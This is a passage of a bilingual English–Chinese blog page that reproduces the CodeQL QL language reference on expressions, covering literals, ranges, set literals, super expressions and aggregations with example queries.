id="Variable-references¶变量引用"><a href="#Variable-references¶变量引用" class="headerlink" title="Variable references¶变量引用"></a>Variable references<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#variable-references" target="_blank" rel="noopener">¶</a>变量引用</h2><p>A variable reference is the name of a declared <a href="https://codeql.github.com/docs/ql-language-reference/variables/#variables" target="_blank" rel="noopener">variable</a>. This kind of expression has the same type as the variable it refers to.</p><blockquote><p>变量引用是一个声明变量的名称。这种表达式的类型与它所引用的变量的类型相同。</p></blockquote><p>For example, if you have <a href="https://codeql.github.com/docs/ql-language-reference/variables/#variable-declarations" target="_blank" rel="noopener">declared</a> the variables <code>int i</code> and <code>LocalScopeVariable lsv</code>, then the expressions <code>i</code> and <code>lsv</code> have types <code>int</code> and <code>LocalScopeVariable</code> respectively.</p><blockquote><p>例如，如果你声明了变量int i和LocalScopeVariable lsv，那么表达式i和lsv的类型分别为int和LocalScopeVariable。</p></blockquote><p>You can also refer to the variables <code>this</code> and <code>result</code>. These are used in <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates" target="_blank" rel="noopener">predicate</a> definitions and act in the same way as other variable references.</p><blockquote><p>您还可以引用变量this和result。这些变量在谓词定义中使用，其作用与其他变量引用相同。</p></blockquote><h2 id="Literals¶字符"><a href="#Literals¶字符" class="headerlink" title="Literals¶字符"></a>Literals<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#literals" target="_blank" rel="noopener">¶</a>字符</h2><p>You can express certain values directly in QL, such as numbers, booleans, and strings.</p><blockquote><p>你可以直接在QL中表达某些值，如数字、布尔和字符串。</p></blockquote><ul><li><p><a href="https://codeql.github.com/docs/ql-language-reference/types/#boolean" target="_blank" rel="noopener">Boolean</a> literals: These are the values <code>true</code> and <code>false</code>.</p></li><li><blockquote><p>布尔值：真和假。</p></blockquote></li><li><p><a href="https://codeql.github.com/docs/ql-language-reference/types/#int" target="_blank" rel="noopener">Integer</a> literals: These are sequences of decimal digits (<code>0</code> through <code>9</code>), possibly starting with a minus sign (<code>-</code>). For example:</p></li><li><blockquote><p>整数字面意义：这些是十进制数字（0到9）的序列，可能以减号（-）开始</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">42</span><br><span class="line">-2048</span><br></pre></td></tr></table></figure></li><li><p><a href="https://codeql.github.com/docs/ql-language-reference/types/#float" target="_blank" rel="noopener">Float</a> literals: These are sequences of decimal digits separated by a dot (<code>.</code>), possibly starting with a minus sign (<code>-</code>). For example:</p></li><li><blockquote><p>浮点数。这些是由点（…）分隔的十进制数字序列，可能以减号（-）开头。例如：</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.0</span><br><span class="line">123.456</span><br><span class="line">-100.5</span><br></pre></td></tr></table></figure></li><li><p><a href="https://codeql.github.com/docs/ql-language-reference/types/#string" target="_blank" rel="noopener">String</a> literals: These are finite strings of 16-bit characters. You can define a string literal by enclosing characters in quotation marks (<code>&quot;...&quot;</code>). Most characters represent themselves, but there are a few characters that you need to “escape” with a backslash. The following are examples of string literals:</p></li><li><blockquote><p>字符串。这些是16位字符的有限字符串。你可以通过用引号(“…”)括起字符来定义一个字符串字面意义。大多数字符代表自己，但也有一些字符需要用反斜杠 “转义”。下面是字符串文字的例子:</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot;</span><br><span class="line">&quot;They said, \&quot;Please escape quotation marks!\&quot;&quot;</span><br></pre></td></tr></table></figure><p>  See <a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#string-literals-string" target="_blank" rel="noopener">String literals</a> in the QL language specification for more details.</p><blockquote><p>更多细节请参见QL语言规范中的字符串</p></blockquote><p>  Note: there is no “date literal” in QL. Instead, to specify a <a href="https://codeql.github.com/docs/ql-language-reference/types/#date" target="_blank" rel="noopener">date</a>, you should convert a string to the date that it represents using the <code>toDate()</code> predicate. For example, <code>&quot;2016-04-03&quot;.toDate()</code> is the date April 3, 2016, and <code>&quot;2000-01-01 00:00:01&quot;.toDate()</code> is the point in time one second after New Year 2000.</p><blockquote><p>注意：QL中没有 “日期文字”。相反，要指定一个日期，应该使用toDate()谓词将一个字符串转换为它所代表的日期。例如，”2016-04-03”.toDate()是2016年4月3日的日期，”2000-01-01 00:00:01”.toDate()是2000年新年后一秒钟的时间点。</p></blockquote><ul><li><p>The following string formats are recognized as dates:</p></li><li><blockquote><p>以下的字符串格式可以识别为日期。</p></blockquote><p>  <strong>ISO dates</strong>, such as <code>&quot;2016-04-03 17:00:24&quot;</code>. The seconds part is optional (assumed to be <code>&quot;00&quot;</code> if it’s missing), and the entire time part can also be missing (in which case it’s assumed to be <code>&quot;00:00:00&quot;</code>).<strong>Short-hand ISO dates</strong>, such as <code>&quot;20160403&quot;</code>.<strong>UK-style dates</strong>, such as <code>&quot;03/04/2016&quot;</code>.<strong>Verbose dates</strong>, such as <code>&quot;03 April 2016&quot;</code>.</p><blockquote><p>ISO日期，如 “2016-04-03 17:00:24”。秒的部分是可选的（如果缺失，则假定为 “00”），整个时间部分也可以缺失（在这种情况下，假定为 “00:00:00”）。<br>短手ISO日期，如 “20160403”。<br>英国式日期，如 “03/04/2016”。<br>啰嗦的日期，如 “03 April 2016”。</p></blockquote></li></ul></li></ul><h2 id="Parenthesized-expressions¶括号表达式"><a href="#Parenthesized-expressions¶括号表达式" class="headerlink" title="Parenthesized expressions¶括号表达式"></a>Parenthesized expressions<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#parenthesized-expressions" target="_blank" rel="noopener">¶</a>括号表达式</h2><p>A parenthesized expression is an expression surrounded by parentheses, <code>(</code> and <code>)</code>. This expression has exactly the same type and values as the original expression. Parentheses are useful for grouping expressions together to remove ambiguity and improve readability.</p><blockquote><p>小括号表达式是指用括号,（和）包围的表达式。该表达式的类型和值与原始表达式完全相同。圆括号对于将表达式分组以消除歧义和提高可读性非常有用。</p></blockquote><h2 id="Ranges¶范围"><a href="#Ranges¶范围" class="headerlink" title="Ranges¶范围"></a>Ranges<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#ranges" target="_blank" rel="noopener">¶</a>范围</h2><p>A range expression denotes a range of values ordered between two expressions. It consists of two expressions separated by <code>..</code> and enclosed in brackets (<code>[</code> and <code>]</code>). For example, <code>[3 .. 7]</code> is a valid range expression. Its values are any integers between <code>3</code> and <code>7</code> (including <code>3</code> and <code>7</code> themselves).</p><blockquote><p>范围表达式表示两个表达式之间排序的数值范围。它由两个表达式组成，用…隔开，并用括号（[和]）括起来。例如，[3 … 7]是一个有效的范围表达式。它的值是3和7之间的任何整数（包括3和7本身）。</p></blockquote><p>In a valid range, the start and end expression are integers, floats, or dates. If one of them is a date, then both must be dates. If one of them is an integer and the other a float, then both are treated as floats.</p><blockquote><p>在一个有效的范围中，开始和结束表达式是整数、浮点数或日期。如果其中一个是日期，那么两个都必须是日期。如果其中一个是整数，另一个是浮点数，那么两者都被视为浮点数。</p></blockquote><hr><h2 id="Set-literal-expressions¶设置文本表达式"><a href="#Set-literal-expressions¶设置文本表达式" class="headerlink" title="Set literal expressions¶设置文本表达式"></a>Set literal expressions<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#set-literal-expressions" target="_blank" rel="noopener">¶</a>设置文本表达式</h2><p>A set literal expression allows the explicit listing of a choice between several values. It consists of a comma-separated collection of expressions that are enclosed in brackets (<code>[</code> and <code>]</code>). For example, <code>[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]</code> is a valid set literal expression. Its values are the first ten prime numbers.</p><blockquote><p>set-literal 表达式允许明确地列出几个值之间的选择。它由一个逗号分隔的表达式集合组成，这些表达式用括号（[ 和 ]）括起来。例如，[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]是一个有效的集合文字表达式。它的值是前十个质数。</p></blockquote><p>The values of the contained expressions need to be of <a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility" target="_blank" rel="noopener">compatible types</a> for a valid set literal expression. Furthermore, at least one of the set elements has to be of a type that is a supertype of the types of all the other contained expressions.</p><blockquote><p>对于一个有效的set-literal 表达式来说，所包含的表达式的值必须是兼容类型。此外，至少有一个集合元素的类型必须是所有其他包含的表达式类型的超类型。</p></blockquote><p>Set literals are supported from release 2.1.0 of the CodeQL CLI, and release 1.24 of LGTM Enterprise.</p><blockquote><p>从CodeQL CLI的2.1.0版本和LGTM Enterprise的1.24版本开始，就支持集合文字表达式。</p></blockquote><h2 id="Super-expressions¶超级表达式"><a href="#Super-expressions¶超级表达式" class="headerlink" title="Super expressions¶超级表达式"></a>Super expressions<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#super-expressions" target="_blank" rel="noopener">¶</a>超级表达式</h2><p>Super expressions in QL are similar to super expressions in other programming languages, such as Java. You can use them in predicate calls, when you want to use the predicate definition from a supertype. In practice, this is useful when a predicate inherits two definitions from its supertypes. In that case, the predicate must <a href="https://codeql.github.com/docs/ql-language-reference/types/#overriding-member-predicates" target="_blank" rel="noopener">override</a> those definitions to avoid ambiguity. However, if you want to use the definition from a particular supertype instead of writing a new definition, you can use a super expression.</p><blockquote><p>QL中的超级表达式类似于其他编程语言中的超级表达式，例如Java。当你想使用来自超级类型的谓词定义时，你可以在谓词调用中使用它们。在实践中，当一个谓词从其超类型中继承了两个定义时，这很有用。在这种情况下，谓词必须覆盖这些定义以避免歧义。然而，如果你想使用来自特定超类型的定义，而不是编写一个新的定义，你可以使用超级表达式。</p></blockquote><p>In the following example, the class <code>C</code> inherits two definitions of the predicate <code>getANumber()</code>—one from <code>A</code> and one from <code>B</code>. Instead of overriding both definitions, it uses the definition from <code>B</code>.</p><blockquote><p>在下面的示例中，类C继承了谓词getANumber()的两个定义–一个来自于A，一个来自于B，它没有覆盖这两个定义，而是使用了B的定义。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class A extends int &#123;</span><br><span class="line">    A() &#123; this &#x3D; 1 &#125;</span><br><span class="line">    int getANumber() &#123; result &#x3D; 2 &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B extends int &#123;</span><br><span class="line">    B() &#123; this &#x3D; 1 &#125;</span><br><span class="line">    int getANumber() &#123; result &#x3D; 3 &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C extends A, B &#123;</span><br><span class="line">  &#x2F;&#x2F; Need to define &#96;int getANumber()&#96;; otherwise it would be ambiguous</span><br><span class="line">    override int getANumber() &#123; &#x2F;&#x2F; 最新版必须加override关键字</span><br><span class="line">        result &#x3D; B.super.getANumber()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from C c</span><br><span class="line">select c, c.getANumber()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/3u59er3ec/3u59er3ec.png" alt="image-20210316195903686"></p><h2 id="Calls-to-predicates-with-result-¶谓词调用-带结果"><a href="#Calls-to-predicates-with-result-¶谓词调用-带结果" class="headerlink" title="Calls to predicates (with result)¶谓词调用(带结果)"></a>Calls to predicates (with result)<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#calls-to-predicates-with-result" target="_blank" rel="noopener">¶</a>谓词调用(带结果)</h2><p>Calls to <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates-with-result" target="_blank" rel="noopener">predicates with results</a> are themselves expressions, unlike calls to <a href="https://codeql.github.com/docs/ql-language-reference/predicates/#predicates-without-result" target="_blank" rel="noopener">predicates without results</a> which are formulas. For more information, see “<a href="https://codeql.github.com/docs/ql-language-reference/formulas/#calls" target="_blank" rel="noopener">Calls to predicates</a>.”</p><blockquote><p>对有结果的谓词的调用本身就是表达式，不像对没有结果的谓词的调用是公式。更多信息，请参见 “对谓词的调用”。</p></blockquote><p>A call to a predicate with result evaluates to the values of the <code>result</code> variable of the called predicate.</p><blockquote><p>对带结果的谓词的调用会评估到被调用的谓词的结果变量的值。</p></blockquote><p>For example <code>a.getAChild()</code> is a call to a predicate <code>getAChild()</code> on a variable <code>a</code>. This call evaluates to the set of children of <code>a</code>.</p><blockquote><p>例如，a.getAChild()是对变量a的谓词getAChild()的调用，该调用的值是a的子集。</p></blockquote><h2 id="Aggregations¶聚合"><a href="#Aggregations¶聚合" class="headerlink" title="Aggregations¶聚合"></a>Aggregations<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#aggregations" target="_blank" rel="noopener">¶</a>聚合</h2><p>An aggregation is a mapping that computes a result value from a set of input values that are specified by a formula.</p><blockquote><p>聚合是一种映射，它从一组由公式指定的输入值中计算出一个结果值。</p></blockquote><p>The general syntax is:</p><blockquote><p>一般语法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aggregate&gt;(&lt;variable declarations&gt; | &lt;formula&gt; | &lt;expression&gt;)</span><br></pre></td></tr></table></figure><p>The variables <a href="https://codeql.github.com/docs/ql-language-reference/variables/#variable-declarations" target="_blank" rel="noopener">declared</a> in <code>&lt;variable declarations&gt;</code> are called the <strong>aggregation variables</strong>.</p><blockquote><p>在&lt;变量声明&gt;中声明的变量称为聚合变量。</p></blockquote><p>Ordered aggregates (namely <code>min</code>, <code>max</code>, <code>rank</code>, <code>concat</code>, and <code>strictconcat</code>) are ordered by their <code>&lt;expression&gt;</code> values by default. The ordering is either numeric (for integers and floating point numbers) or lexicographic (for strings). Lexicographic ordering is based on the <a href="https://en.wikipedia.org/wiki/List_of_Unicode_characters#Basic_Latin" target="_blank" rel="noopener">Unicode value</a> of each character.</p><blockquote><p>有序聚合（即min、max、rank、concat和strictconcat）默认按照它们的<expression>值排序。排序方式可以是数字排序（对于整数和浮点数），也可以是词法排序（对于字符串）。词法排序是基于每个字符的Unicode值。</expression></p></blockquote><p>To specify a different order, follow <code>&lt;expression&gt;</code> with the keywords <code>order by</code>, then the expression that specifies the order, and optionally the keyword <code>asc</code> or <code>desc</code> (to determine whether to order the expression in ascending or descending order). If you don’t specify an ordering, it defaults to <code>asc</code>.</p><blockquote><p>要指定不同的顺序，请在<expression>后面加上关键字order by，然后是指定顺序的表达式，以及可选的关键字asc或desc（用于确定表达式是按升序还是降序排列）。如果你没有指定排序，它默认为升序。</expression></p></blockquote><p>The following aggregates are available in QL:</p><blockquote><p>QL中提供了以下聚合。</p></blockquote><ul><li><p><code>count</code>: This aggregate determines the number of distinct values of <code>&lt;expression&gt;</code> for each possible assignment of the aggregation variables.</p></li><li><blockquote><p>count。该聚合确定了<expression>的每个可能的聚合变量赋值的不同值的数量。</expression></p></blockquote><p>  For example, the following aggregation returns the number of files that have more than <code>500</code> lines:</p><blockquote><p>例如，下面的聚合返回的是超过500行的文件数。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count(File f | f.getTotalNumberOfLines() &gt; 500 | f)</span><br></pre></td></tr></table></figure><p>  If there are no possible assignments to the aggregation variables that satisfy the formula, as in <code>count(int i | i = 1 and i = 2 | i)</code>, then <code>count</code> defaults to the value <code>0</code>.</p><blockquote><p>count(File f | f.getTotalNumberOfLines() &gt; 500 | f)<br>如果没有满足公式的聚合变量的可能赋值，如count(int i | i = 1 and i = 2 | i)，那么count默认为值0。</p></blockquote></li><li><p><code>min</code> and <code>max</code>: These aggregates determine the smallest (<code>min</code>) or largest (<code>max</code>) value of <code>&lt;expression&gt;</code> among the possible assignments to the aggregation variables. In this case, <code>&lt;expression&gt;</code> must be of numeric type or of type <code>string</code>.</p></li><li><blockquote><p>min和max。这些聚合变量决定了<expression>在可能的聚合变量赋值中的最小（最小）或最大（最大）值。在这种情况下，<expression>必须是数字类型或字符串类型。</expression></expression></p></blockquote><p>For example, the following aggregation returns the name of the <code>.js</code> file (or files) with the largest number of lines:</p><blockquote><p>例如，以下聚合返回行数最多的.js文件（或文件）的名称</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max(File f | f.getExtension() &#x3D; &quot;js&quot; | f.getBaseName() order by f.getTotalNumberOfLines())</span><br></pre></td></tr></table></figure><p>The following aggregation returns the minimum string <code>s</code> out of the three strings mentioned below, that is, the string that comes first in the lexicographic ordering of all the possible values of <code>s</code>. (In this case, it returns <code>&quot;De Morgan&quot;</code>.)</p><blockquote><p>下面的聚合返回下面提到的三个字符串中最小的字符串s，即在所有可能的s值的词法排序中排在第一位的字符串（在本例中，它返回 “德摩根”）。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">min(string s | s &#x3D; &quot;Tarski&quot; or s &#x3D; &quot;Dedekind&quot; or s &#x3D; &quot;De Morgan&quot; | s)</span><br></pre></td></tr></table></figure></li><li><p><code>avg</code>: This aggregate determines the average value of <code>&lt;expression&gt;</code> for all possible assignments to the aggregation variables. The type of <code>&lt;expression&gt;</code> must be numeric. If there are no possible assignments to the aggregation variables that satisfy the formula, the aggregation fails and returns no values. In other words, it evaluates to the empty set.</p><blockquote><p>avg：该集合确定<expression>对所有可能的集合变量分配的平均值。<expression>的类型必须是数字型。如果聚合变量没有满足公式的可能赋值，则聚合失败，不返回任何值。换句话说，它评估为空集。</expression></expression></p></blockquote><p>  For example, the following aggregation returns the average of the integers <code>0</code>, <code>1</code>, <code>2</code>, and <code>3</code>:</p><blockquote><p>例如，下面的聚合返回的是整数0、1、2和3的平均值。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">avg(int i | i &#x3D; [0 .. 3] | i)</span><br></pre></td></tr></table></figure></li><li><p><code>sum</code>: This aggregate determines the sum of the values of <code>&lt;expression&gt;</code> over all possible assignments to the aggregation variables. The type of <code>&lt;expression&gt;</code> must be numeric. If there are no possible assignments to the aggregation variables that satisfy the formula, then the sum is <code>0</code>.</p></li><li><blockquote><p>sum:该集合确定<expression>值在所有可能的集合变量分配中的总和。<expression>的类型必须是数字型。如果没有满足公式的聚合变量的可能赋值，那么总和为0。</expression></expression></p></blockquote><p>  For example, the following aggregation returns the sum of <code>i * j</code> for all possible values of <code>i</code> and <code>j</code>:</p><blockquote><p>例如，下面的聚合返回i*j的所有可能的i和j的值之和。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum(int i, int j | i &#x3D; [0 .. 2] and j &#x3D; [3 .. 5] | i * j)</span><br></pre></td></tr></table></figure></li><li><p><code>concat</code>: This aggregate concatenates the values of <code>&lt;expression&gt;</code> over all possible assignments to the aggregation variables. Note that <code>&lt;expression&gt;</code> must be of type <code>string</code>. If there are no possible assignments to the aggregation variables that satisfy the formula, then <code>concat</code> defaults to the empty string.</p></li><li><blockquote><p>concat:该聚合将<expression>的值与所有可能的聚合变量分配相连接。注意<expression>必须是字符串类型。如果聚合变量没有满足公式的可能赋值，那么concat默认为空字符串。</expression></expression></p></blockquote><p>  For example, the following aggregation returns the string <code>&quot;3210&quot;</code>, that is, the concatenation of the strings <code>&quot;0&quot;</code>, <code>&quot;1&quot;</code>, <code>&quot;2&quot;</code>, and <code>&quot;3&quot;</code> in descending order:</p><blockquote><p>例如，下面的聚合返回字符串 “3210”，也就是字符串 “0”、”1”、”2 “和 “3 “的降序连接</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(int i | i &#x3D; [0 .. 3] | i.toString() order by i desc)</span><br></pre></td></tr></table></figure><p>  The <code>concat</code> aggregate can also take a second expression, separated from the first one by a comma. This second expression is inserted as a separator between each concatenated value.</p><blockquote><p>concat aggregate也可以使用第二个表达式，用逗号与第一个表达式隔开。这第二个表达式被插入作为每个连接值之间的分隔符。</p></blockquote><p>  For example, the following aggregation returns <code>&quot;0|1|2|3&quot;</code>:</p><blockquote><p>例如，下面的聚合返回 “0|1|2|3”。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(int i | i &#x3D; [0 .. 3] | i.toString(), &quot;|&quot;)</span><br></pre></td></tr></table></figure></li><li><p><code>rank</code>: This aggregate takes the possible values of <code>&lt;expression&gt;</code> and ranks them. In this case, <code>&lt;expression&gt;</code> must be of numeric type or of type <code>string</code>. The aggregation returns the value that is ranked in the position specified by the <strong>rank expression</strong>. You must include this rank expression in brackets after the keyword <code>rank</code>.</p></li><li><blockquote><p>rank: 这个集合将<expression>的可能值进行排序。在这种情况下，<expression>必须是数字类型或字符串类型。聚合将返回排名在rank表达式指定位置的值。您必须在关键字 rank 后面的括号中包含这个 rank 表达式。</expression></expression></p></blockquote><p>  For example, the following aggregation returns the value that is ranked 4th out of all the possible values. In this case, <code>8</code> is the 4th integer in the range from <code>5</code> through <code>15</code>:</p><blockquote><p>例如，以下聚合返回在所有可能的值中排名第4的值。在这种情况下，8是5到15范围内的第4个整数。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rank[4](int i | i &#x3D; [5 .. 15] | i)</span><br></pre></td></tr></table></figure><p>  Note that the rank indices start at <code>1</code>, so <code>rank[0](...)</code> returns no results.</p><blockquote><p>请注意，rank指数从1开始，所以rank[0](…)不返回结果。</p></blockquote></li><li><p><code>strictconcat</code>, <code>strictcount</code>, and <code>strictsum</code>: These aggregates work like <code>concat</code>, <code>count</code>, and <code>sum</code> respectively, except that they are <em>strict</em>. That is, if there are no possible assignments to the aggregation variables that satisfy the formula, then the entire aggregation fails and evaluates to the empty set (instead of defaulting to <code>0</code> or the empty string). This is useful if you’re only interested in results where the aggregation body is non-trivial.</p></li><li><blockquote><p>strictconcat、strictcount和stictsum。这些聚合的工作原理分别和concat, count, sum一样, 除了它们是严格的. 也就是说，如果聚合变量没有满足公式的可能赋值，那么整个聚合就会失败，并评估为空集（而不是默认为0或空字符串）。如果你只对聚合体是非平凡的结果感兴趣，这很有用。</p></blockquote></li><li><p><code>unique</code>: This aggregate depends on the values of <code>&lt;expression&gt;</code> over all possible assignments to the aggregation variables. If there is a unique value of <code>&lt;expression&gt;</code> over the aggregation variables, then the aggregate evaluates to that value. Otherwise, the aggregate has no value.</p></li><li><blockquote><p><code>unique</code>: 取决于<expression>在所有可能的聚合变量赋值上的值。如果<expression>在聚合变量上有一个唯一的值，那么聚合体就会评估为该值。否则，聚合就没有值。</expression></expression></p></blockquote><p>  For example, the following query returns the positive integers <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code>, <code>5</code>. For negative integers <code>x</code>, the expressions <code>x</code> and <code>x.abs()</code> have different values, so the value for <code>y</code> in the aggregate expression is not uniquely determined.</p><blockquote><p>例如，下面的查询返回正整数1，2，3，4，5。对于负整数x，表达式x和x.abs()具有不同的值，因此聚合表达式中y的值不是唯一确定的。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    from int x</span><br><span class="line">    where x in [-5 .. 5] and x !&#x3D; 0</span><br><span class="line">select unique(int y | y &#x3D; x or y &#x3D; x.abs() | y)</span><br></pre></td></tr></table></figure><p>  <img src="https://gitee.com/samny/images/raw/master/13u33er13ec/13u33er13ec.png" alt="image-20210316203313463"></p><p>  The <code>unique</code> aggregate is supported from release 2.1.0 of the CodeQL CLI, and release 1.24 of LGTM Enterprise.</p><blockquote><p>从CodeQL CLI的2.1.0版本和LGTM Enterprise的1.24版本开始支持<code>unique</code> 的聚合。</p></blockquote></li></ul><h3 id="Evaluation-of-aggregates¶聚合合计"><a href="#Evaluation-of-aggregates¶聚合合计" class="headerlink" title="Evaluation of aggregates¶聚合合计"></a>Evaluation of aggregates<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#evaluation-of-aggregates" target="_blank" rel="noopener">¶</a>聚合合计</h3><p>In general, aggregate evaluation involves the following steps:</p><blockquote><p>一般来说，集合评价包括以下步骤:</p></blockquote><ol><li><p>Determine the input variables: these are the aggregation variables declared in <code>&lt;variable declarations&gt;</code> and also the variables declared outside of the aggregate that are used in some component of the aggregate.</p><blockquote><p>确定输入变量：这些变量是在&lt;变量声明&gt;中声明的集合变量，也是在集合之外声明的、用于集合的某些组成部分的变量。</p></blockquote></li><li><p>Generate all possible distinct tuples (combinations) of the values of input variables such that the <code>&lt;formula&gt;</code> holds true. Note that the same value of an aggregate variable may appear in multiple distinct tuples. All such occurrences of the same value are treated as distinct occurrences when processing tuples.</p><blockquote><p>生成所有可能的输入变量值的不同元组（组合），使&lt;公式&gt;成立。请注意，一个集合变量的同一个值可能出现在多个不同的元组中。当处理元组时，所有这些相同值的出现都被视为不同的出现。</p></blockquote></li><li><p>Apply <code>&lt;expression&gt;</code> on each tuple and collect the generated (distinct) values. The application of <code>&lt;expression&gt;</code> on a tuple may result in generating more than one value.</p><blockquote><p>在每个元组上应用<expression>并收集生成的（不同的）值。在一个元组上应用<expression>可能会导致生成一个以上的值。</expression></expression></p></blockquote></li><li><p>Apply the aggregation function on the values generated in step 3 to compute the final result.</p><blockquote><p>在步骤3中生成的值上应用聚合函数来计算最终结果。</p></blockquote></li></ol><p>Let us apply these steps to the <code>sum</code> aggregate in the following query:</p><blockquote><p>让我们在下面的查询中把这些步骤应用到sum聚合中:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sum(int i, int j |</span><br><span class="line">    exists(string s | s &#x3D; &quot;hello&quot;.charAt(i)) and exists(string s | s &#x3D; &quot;world!&quot;.charAt(j)) | i)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/27u54er27ec/27u54er27ec.png" alt="image-20210316205427265"></p><ol><li><p>Input variables: <code>i</code>, <code>j</code>.</p><blockquote><p>输入变量：i，j。</p></blockquote></li><li><p>All possible tuples <code>(&lt;value of i&gt;, &lt;value of j&gt;)</code> satisfying the given condition: <code>(0, 0), (0, 1), (0, 2), (0, 3), (0, 4), (0, 5), (1, 0), (1, 1), ..., (4, 5)</code>.</p><blockquote><p>满足给定条件的所有可能的元组（&lt;i的值&gt;，&lt;j的值&gt;）。(0, 0), (0, 1), (0, 2), (0, 3), (0, 4), (0, 5), (1, 0), (1, 1), …, (4, 5).</p></blockquote><p> 30 tuples are generated in this step.</p><blockquote><p>在这一步骤中会生成30个元组。</p></blockquote></li><li><p>Apply the <code>&lt;expression&gt; i</code> on all tuples. This means selecting all values of <code>i</code> from all tuples: <code>0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 4.</code></p><blockquote><p>在所有元组上应用&lt;表达式&gt;i。这意味着从所有元组中选择i的所有值。0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 4.</p></blockquote></li><li><p>Apply the aggregation function <code>sum</code> on the above values to get the final result <code>60</code>.</p><blockquote><p>在上述数值上应用聚合函数sum，得到最终结果60。</p></blockquote></li></ol><p>If we change <code>&lt;expression&gt;</code> to <code>i + j</code> in the above query, the query result is <code>135</code> since applying <code>i + j</code> on all tuples results in following values: <code>0, 1, 2, 3, 4, 5, 1, 2, 3, 4, 5, 6, 2, 3, 4, 5, 6, 7, 3, 4, 5, 6, 7, 8, 4, 5, 6, 7, 8, 9</code>.</p><blockquote><p>如果我们将上述查询中的<expression>改为i+j，则查询结果为135，因为将i+j应用于所有元组上的结果如下。0, 1, 2, 3, 4, 5, 1, 2, 3, 4, 5, 6, 2, 3, 4, 5, 6, 7, 3, 4, 5, 6, 7, 8, 4, 5, 6, 7, 8, 9.</expression></p></blockquote><p>Next, consider the following query:</p><blockquote><p>接下来，考虑下面的查询: </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(string s | s &#x3D; &quot;hello&quot; | s.charAt(_))</span><br></pre></td></tr></table></figure><ol><li><p><code>s</code> is the input variable of the aggregate.</p><blockquote><p>s是集合的输入变量。</p></blockquote></li><li><p>A single tuple <code>&quot;hello&quot;</code> is generated in this step.</p><blockquote><p>在这一步骤中会生成一个单一元组 “hello”。</p></blockquote></li><li><p>The <code>&lt;expression&gt; charAt(_)</code> is applied on this tuple. The underscore <code>_</code> in <code>charAt(_)</code> is a <a href="https://codeql.github.com/docs/ql-language-reference/expressions/#don-t-care-expressions" target="_blank" rel="noopener">don’t-care expression</a>, which represents any value. <code>s.charAt(_)</code> generates four distinct values <code>h, e, l, o</code>.</p><blockquote><p>&lt;表达式&gt; 